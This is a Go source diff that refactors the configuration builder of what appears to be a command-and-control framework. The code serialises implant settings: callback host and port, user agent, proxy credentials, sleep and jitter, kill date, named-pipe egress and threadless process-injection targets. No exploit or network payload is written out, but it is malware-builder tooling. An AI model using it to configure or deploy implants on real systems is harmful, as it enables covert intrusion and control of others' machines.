@@ -4,13 +4,12 @@ import (
 	"encoding/json"
 	"errors"
 	"fmt"
-	"hexane_server/cmd"
 	"os"
 	"strconv"
 	"strings"
 )
 
-var StringsList = []string{
+var ModuleStrings = []string{
 	"crypt32",
 	"winhttp",
 	"advapi32",
@@ -18,30 +17,28 @@ var StringsList = []string{
 }
 
 var (
-	Fstat = os.O_WRONLY | os.O_CREATE | os.O_TRUNC
+	ConfigsPath 	= RootDirectory + "/configs"
+	CorePath 		= RootDirectory + "/core"
+	ImplantPath 	= RootDirectory + "/implant"
+	InjectPath 		= RootDirectory + "/inject"
+	LoaderPath 		= RootDirectory + "/loader"
+	LogsPath 		= RootDirectory + "/logs"
+	ModsPath 		= RootDirectory + "/mods"
+	PayloadPath 	= RootDirectory + "/payload"
 
-	Logs        = RootDirectory + "logs"
-	PayloadPath = RootDirectory + "payload"
-	StringsFile = RootDirectory + "configs/strings.txt"
-	HashHeader  = RootDirectory + "core/include/names.hpp"
-	RsrcScript  = RootDirectory + "loader/resource.rc"
-	LoadersCpp  = RootDirectory + "loader/ldrcore.cpp"
-	LoaderDll   = RootDirectory + "loader/DllMain.cpp"
-	MainExe     = RootDirectory + "core/implant/MainExe.cpp"
-	Ld          = RootDirectory + "implant/linker.implant.ld"
 )
+var Fstat = os.O_WRONLY | os.O_CREATE | os.O_TRUNC
 
-func (h *HexaneConfig) GetEmbededStrings() []byte {
-	var stream = new(Stream)
-
-	stream.PackString(string(h.Key))
-
-	for _, str := range StringsList {
-		stream.PackString(str)
+var (
+	Debug    bool
+	Cb       = make(chan Callback)
+	Payloads = new(HexanePayloads)
+	Servers  = new(ServerList)
+	Session  = &HexaneSession{
+		Username: "lemur",
+		Admin:    true,
 	}
-
-	return stream.Buffer
-}
+)
 
 func (h *HexaneConfig) CreateConfig(jsonCfg JsonConfig) error {
 	var err error
@@ -151,8 +148,8 @@ func ReadConfig(cfgName string) error {
 		hexane.GroupId = GetGIDByPeerName(hexane.Implant.EgressPeer)
 
 	} else {
-		cmd.Payloads.Group++
-		hexane.GroupId = cmd.Payloads.Group
+		Payloads.Group++
+		hexane.GroupId = Payloads.Group
 	}
 
 	hexane.Implant.PeerId = GeneratePeerId()
@@ -171,7 +168,7 @@ func ReadConfig(cfgName string) error {
 		hexane.Implant.Injection.Threadless.ModuleName = jsonCfg.Injection.Threadless.ModuleName + string(byte(0x00))
 		hexane.Implant.Injection.Threadless.ProcName = jsonCfg.Injection.Threadless.ProcName + string(byte(0x00))
 		hexane.Implant.Injection.Threadless.FuncName = jsonCfg.Injection.Threadless.FuncName + string(byte(0x00))
-		hexane.Implant.Injection.Threadless.LdrExecute = jsonCfg.Injection.Threadless.LdrExecute
+		hexane.Implant.Injection.Threadless.Execute = jsonCfg.Injection.Threadless.Execute
 	}
 
 	if jsonCfg.Network.ProfileType == "http" {
@@ -209,13 +206,13 @@ func ReadConfig(cfgName string) error {
 		hexane.Implant.EgressPipe = GenerateUuid(24)
 	}
 
-	hexane.UserSession = cmd.Session
+	hexane.UserSession = Session
 	return hexane.RunBuild()
 }
 
 func (h *HexaneConfig) PePatchConfig() ([]byte, error) {
 	var (
-		hStream = CreateStream()
+		stream = CreateStream()
 		Hours   int32
 		err     error
 	)
@@ -224,51 +221,51 @@ func (h *HexaneConfig) PePatchConfig() ([]byte, error) {
 		return nil, err
 	}
 
-	hStream.AddString(h.Implant.Hostname)
-	hStream.AddString(h.Implant.Domain)
-	hStream.AddDword(h.Implant.PeerId)
-	hStream.AddDword(h.Implant.Sleeptime)
-	hStream.AddDword(h.Implant.Jitter)
-	hStream.AddInt32(Hours)
-	hStream.AddDword64(h.Implant.Killdate)
+	stream.PackString(h.Implant.Hostname)
+	stream.PackString(h.Implant.Domain)
+	stream.PackDword(h.Implant.PeerId)
+	stream.PackDword(h.Implant.Sleeptime)
+	stream.PackDword(h.Implant.Jitter)
+	stream.PackInt32(Hours)
+	stream.PackDword64(h.Implant.Killdate)
 
 	switch h.Implant.ProfileTypeId {
 	case TRANSPORT_HTTP:
 		{
 			var httpCfg = h.Implant.Profile.(*HttpConfig)
 
-			hStream.AddWString(httpCfg.Useragent)
-			hStream.AddWString(httpCfg.Address)
-			hStream.AddDword(uint32(httpCfg.Port))
+			stream.PackWString(httpCfg.Useragent)
+			stream.PackWString(httpCfg.Address)
+			stream.PackDword(uint32(httpCfg.Port))
 
 			if len(httpCfg.Endpoints) == 0 {
-				hStream.AddDword(1)
-				hStream.AddWString("/")
+				stream.PackDword(1)
+				stream.PackWString("/")
 
 			} else {
-				hStream.AddDword(uint32(len(httpCfg.Endpoints)))
+				stream.PackDword(uint32(len(httpCfg.Endpoints)))
 				for _, uri := range httpCfg.Endpoints {
-					hStream.AddWString(uri)
+					stream.PackWString(uri)
 				}
 			}
 			if h.Implant.ProxyBool {
 				var proxyUrl = fmt.Sprintf("%v://%v:%v", h.Proxy.Proto, h.Proxy.Address, h.Proxy.Port)
 
-				hStream.AddDword(1)
-				hStream.AddWString(proxyUrl)
-				hStream.AddWString(h.Proxy.Username)
-				hStream.AddWString(h.Proxy.Password)
+				stream.PackDword(1)
+				stream.PackWString(proxyUrl)
+				stream.PackWString(h.Proxy.Username)
+				stream.PackWString(h.Proxy.Password)
 
 			} else {
-				hStream.AddDword(0)
+				stream.PackDword(0)
 			}
 
 			break
 		}
 	case TRANSPORT_PIPE:
 		{
-			hStream.AddWString(h.Implant.EgressPipe)
+			stream.PackWString(h.Implant.EgressPipe)
 		}
 	}
-	return hStream.Buffer, err
+	return stream.Buffer, err
 }
